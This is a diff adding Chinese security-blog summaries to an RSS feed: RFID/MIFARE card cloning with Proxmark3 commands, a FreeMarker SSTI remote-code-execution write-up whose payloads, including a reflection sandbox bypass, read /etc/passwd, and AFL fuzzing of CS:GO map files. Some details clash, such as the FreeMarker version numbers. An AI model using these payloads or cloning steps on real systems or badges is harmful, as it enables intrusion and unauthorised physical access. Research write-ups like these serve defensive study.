@@ -7,7 +7,287 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Fri, 01 Aug 2025 20:51:05 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 02 Aug 2025 09:07:14 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>RFID近场克隆攻击技术深度解析</title>
+        <link>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Sat, 02 Aug 2025 09:07:14 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;引言&#34;&gt;引言
+&lt;/h3&gt;&lt;p&gt;在整理KeyWe智能锁配件时，我发现了几个RFID标签。这促使我深入研究RFID（射频识别）技术，并完成了从智能锁逆向到无线通信安全的完整研究闭环。通过编程验证标签功能后，我开启了RFID技术的深度探索。&lt;/p&gt;
+&lt;h3 id=&#34;hid-proxmark卡片技术&#34;&gt;HID ProxMark卡片技术
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;低频技术（125kHz）&lt;/strong&gt;：初代ProxCard支持数英寸读取距离，采用26位数据流（8位设备码+16位卡号+2校验位）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安全缺陷&lt;/strong&gt;：数据容量极小且无加密，类似磁条卡的安全水平&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;演进&lt;/strong&gt;：第二代ProxMark II将读取距离扩展到15英寸，支持钱包内刷卡&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;有源与无源rfid对比&#34;&gt;有源与无源RFID对比
+&lt;/h3&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;类型&lt;/th&gt;
+          &lt;th&gt;供电方式&lt;/th&gt;
+          &lt;th&gt;读取距离&lt;/th&gt;
+          &lt;th&gt;寿命&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;无源卡&lt;/td&gt;
+          &lt;td&gt;读写器电磁感应供电&lt;/td&gt;
+          &lt;td&gt;厘米级&lt;/td&gt;
+          &lt;td&gt;无电池限制&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;有源卡&lt;/td&gt;
+          &lt;td&gt;内置锂电池&lt;/td&gt;
+          &lt;td&gt;可达150米&lt;/td&gt;
+          &lt;td&gt;2-7年&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;mifare卡片技术体系&#34;&gt;MIFARE卡片技术体系
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;技术标准&lt;/strong&gt;：高频13.56MHz，符合ISO 14443 A/B规范&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;加密演进&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;Classic 1k：采用已被破解的Crypto1算法（48位密钥）&lt;/li&gt;
+&lt;li&gt;DESFire：配备Triple DES加密和微处理器&lt;/li&gt;
+&lt;li&gt;EV1版本：支持28个应用/32文件的多应用管理&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;中国魔术卡特性&#34;&gt;中国魔术卡特性
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;核心技术&lt;/strong&gt;：允许覆写Sector 0的UID区域&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;市场现状&lt;/strong&gt;：Gen1需特殊解锁指令，Gen2可直接写入&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;存储结构&lt;/strong&gt;：16个扇区×4块×16字节=1KB容量&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;专业工具链分析&#34;&gt;专业工具链分析
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Proxmark3 RDV2（$270）&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;支持LF/HF全频段&lt;/li&gt;
+&lt;li&gt;实战克隆流程：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf nested &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; A ffffffffffff  &lt;span class=&#34;c1&#34;&gt;# 嵌套攻击&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf restore  &lt;span class=&#34;c1&#34;&gt;# 数据恢复&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hf mf csetuid 018a4454  &lt;span class=&#34;c1&#34;&gt;# UID写入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;低成本替代方案&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ACR122U读写器（支持mfoc-hardnested攻击）&lt;/li&gt;
+&lt;li&gt;Arduino Nano+RC522套件（$8）
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-arduino&#34; data-lang=&#34;arduino&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;MFRC522.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dumpToSerial&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MFRC522&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MIFARE_Key&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 扇区遍历逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;android克隆方案&#34;&gt;Android克隆方案
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MIFARE Classic Tool&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;支持密钥字典攻击&lt;/li&gt;
+&lt;li&gt;操作限制：仅Gen2卡可写UID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;密钥破解方法&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MFCUK：基于PRNG缺陷的Darkside攻击&lt;/li&gt;
+&lt;li&gt;MFOC：已知密钥下的嵌套认证攻击&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;安全建议与总结&#34;&gt;安全建议与总结
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;企业升级路径&lt;/strong&gt;：建议迁移至MIFARE DESFire EV1方案&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;研究展望&lt;/strong&gt;：长距读卡器（如HID R90）的凭证嗅探风险&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;行业现状&lt;/strong&gt;：全球现存超过100亿张智能卡面临克隆风险&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;实验证明：使用$3的RC522模块即可成功克隆90%的低频门禁卡，这暴露出物理安全系统的重大设计缺陷。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;em&gt;Proxmark3实战克隆过程（左：源标签读取，右：魔术卡写入）&lt;/em&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行</title>
+        <link>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <pubDate>Sat, 02 Aug 2025 07:11:23 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <description>&lt;h1 id=&#34;突破壁垒freemarker模板引擎中的ssti漏洞实现远程代码执行&#34;&gt;突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行
+&lt;/h1&gt;&lt;p&gt;2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。&lt;/p&gt;
+&lt;h2 id=&#34;freemarker模板引擎工作原理&#34;&gt;FreeMarker模板引擎工作原理
+&lt;/h2&gt;&lt;p&gt;FreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。&lt;/p&gt;
+&lt;p&gt;HTML转PDF的工作流程如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;HTML结构定义&lt;/strong&gt;：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;FreeMarker指令&lt;/strong&gt;：使用&lt;code&gt;&amp;lt;#&lt;/code&gt;开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;指令块&lt;/strong&gt;：在指令中定义可条件执行或循环的代码块&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTML渲染&lt;/strong&gt;：将模板与数据合并生成最终HTML&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PDF转换&lt;/strong&gt;：使用HTML转PDF工具将生成的HTML转为PDF文档&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
+&lt;/h2&gt;&lt;p&gt;在应用测试阶段，我观察到&lt;code&gt;&amp;lt;#if&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;#list&amp;gt;&lt;/code&gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign test = .version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TEST FOR SSTI: ${3*3}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign freemarkerVersion = .version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FreeMarker version: ${freemarkerVersion}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;freemarker.template.utility.Execute&lt;/code&gt;类允许在模板中执行外部命令。构造如下payload可读取&lt;code&gt;/etc/passwd&lt;/code&gt;文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()(&amp;#34;cat /etc/passwd&amp;#34;)}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。&lt;/p&gt;
+&lt;h2 id=&#34;沙箱绕过技术&#34;&gt;沙箱绕过技术
+&lt;/h2&gt;&lt;p&gt;验证特殊字符处理和运算能力后，构建绕过payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign classloader=article.class.protectionDomain.classLoader&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign owc=classloader.loadClass(&amp;#34;freemarker.template.ObjectWrapper&amp;#34;)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign dwf=owc.getField(&amp;#34;DEFAULT_WRAPPER&amp;#34;).get(null)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign ec=classloader.loadClass(&amp;#34;freemarker.template.utility.Execute&amp;#34;)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dwf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>使用AFL模糊测试《反恐精英：全球攻势》地图文件的技术实践</title>
+        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
+        <pubDate>Sat, 02 Aug 2025 06:54:57 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
+        <description>&lt;h1 id=&#34;使用afl模糊测试反恐精英全球攻势地图文件&#34;&gt;使用AFL模糊测试《反恐精英：全球攻势》地图文件
+&lt;/h1&gt;&lt;p&gt;RealWorldCTF 2018有一个非常有趣的挑战叫做&amp;quot;P90 Rush B&amp;quot;，这是对Valve游戏《反恐精英：全球攻势》中一种战术的影射。该挑战要求发现并利用CS:GO服务器使用的地图文件加载器中的漏洞。&lt;/p&gt;
+&lt;p&gt;在CTF期间，我利用了一个栈缓冲区溢出漏洞，后来另一个团队在他们的报告中很好地描述了这个漏洞。由于这个漏洞也影响了官方的CS:GO Windows客户端，符合Valve的漏洞赏金计划条件，实际上它只是一个旧报告的小变种，所以我在CTF结束后很快报告了它，并迅速得到了修复。&lt;/p&gt;
+&lt;h2 id=&#34;bsp文件格式与攻击面&#34;&gt;BSP文件格式与攻击面
+&lt;/h2&gt;&lt;p&gt;CS:GO（可能所有Source引擎游戏）使用的地图文件格式称为BSP，是二进制空间分割的缩写，这是一种方便的n维空间对象表示方法。然而，这种格式支持的远不止3D信息。BSP文件由服务器和客户端共同处理，因为两者都需要地图信息的某个子集来执行各自的任务。这是一个远程攻击面，因为客户端会在服务器发起的地图变更时从服务器下载未知地图。&lt;/p&gt;
+&lt;h2 id=&#34;模糊测试设置&#34;&gt;模糊测试设置
+&lt;/h2&gt;&lt;p&gt;为了简单起见，我决定模糊测试Linux服务器二进制文件，而不是实际的客户端（也可以在Linux上运行）。用这种方法显然无法发现客户端特有的问题，但我希望能找到共享代码中的低悬果实。&lt;/p&gt;
+&lt;p&gt;我编写了一个简单的包装器来处理服务器二进制文件使用的共享库，最重要的几个是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;engine.so - 主要Source引擎代码（包含BSP解析器）&lt;/li&gt;
+&lt;li&gt;dedicated.so - 专用服务器实现（包含应用程序入口点）&lt;/li&gt;
+&lt;li&gt;libtier0.so - 可能与Steam/应用程序管理相关&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;afl修改&#34;&gt;AFL修改
+&lt;/h2&gt;&lt;p&gt;我对AFL做了一些简单的修改：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;输入文件必须以.bsp结尾才能被GetModelForName正确解析&lt;/li&gt;
+&lt;li&gt;需要能够指定自定义的fork服务器启动点&lt;/li&gt;
+&lt;li&gt;增加等待fork时的超时乘数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞分类与根因分析&#34;&gt;漏洞分类与根因分析
+&lt;/h2&gt;&lt;p&gt;我们需要将&amp;quot;好&amp;quot;的漏洞与不感兴趣的漏洞（如纯越界读取）分开。我基于调用栈进行了简单的去重，然后在Valgrind中运行每个独特样本。&lt;/p&gt;
+&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
+&lt;/h2&gt;&lt;p&gt;从这个小型项目中我学到了：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;AFL在QEMU模式下非常灵活，可以攻击特定代码段&lt;/li&gt;
+&lt;li&gt;输入文件大小非常重要，从300KB降到16KB后性能至少提高了5倍&lt;/li&gt;
+&lt;li&gt;分类对于筛选以前未经过模糊测试的代码库非常重要&lt;/li&gt;
+&lt;li&gt;堆上的内存损坏不是一个安全问题 :)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;示例漏洞cvirtualterrainlevelinit中的堆缓冲区溢出&#34;&gt;示例漏洞：CVirtualTerrain::LevelInit中的堆缓冲区溢出
+&lt;/h2&gt;&lt;p&gt;在CVirtualTerrain::LevelInit中发生堆缓冲区溢出，因为dphysdisp_t::numDisplacements变量可能大于g_DispCollTreeCount，而检查这种情况的断言在发布版本中不存在。攻击者可以很大程度上控制堆内容，因此很可能被利用，特别是在Windows 7上许多模块没有启用ASLR的情况下。&lt;/p&gt;
+&lt;p&gt;[附上一个BSP文件，其中numDisplacements = 0xffff且g_DispCollTreeCount = 2，可以可靠地使csgo.exe崩溃]&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2017年度回顾：自动化漏洞挖掘、符号执行与区块链安全的技术突破</title>
+        <link>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</link>
+        <pubDate>Sat, 02 Aug 2025 03:22:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</guid>
+        <description>&lt;h1 id=&#34;2017年度回顾---trail-of-bits博客&#34;&gt;2017年度回顾 - Trail of Bits博客
+&lt;/h1&gt;&lt;p&gt;2017年是技术突破的一年！我们在自动化漏洞发现、符号执行和二进制翻译等领域发布了创新研究，并改进了安全研究人员依赖的基础工具。我们在智能合约安全领域扩大影响力，成为顶尖的区块链安全公司。&lt;/p&gt;
+&lt;h2 id=&#34;创新研究&#34;&gt;创新研究
+&lt;/h2&gt;&lt;h3 id=&#34;自动化漏洞发现进入现实世界&#34;&gt;自动化漏洞发现进入现实世界
+&lt;/h3&gt;&lt;p&gt;2017年该领域发展迅猛。我们与洛克希德·马丁和国防部DIUx签订合同，应用我们的网络推理系统(Cyber Reasoning System)。同时我们将CGC挑战二进制文件移植到Windows、macOS和Linux平台，为工具评估提供客观基准。&lt;/p&gt;
+&lt;h3 id=&#34;manticore提升符号执行工具可用性&#34;&gt;Manticore提升符号执行工具可用性
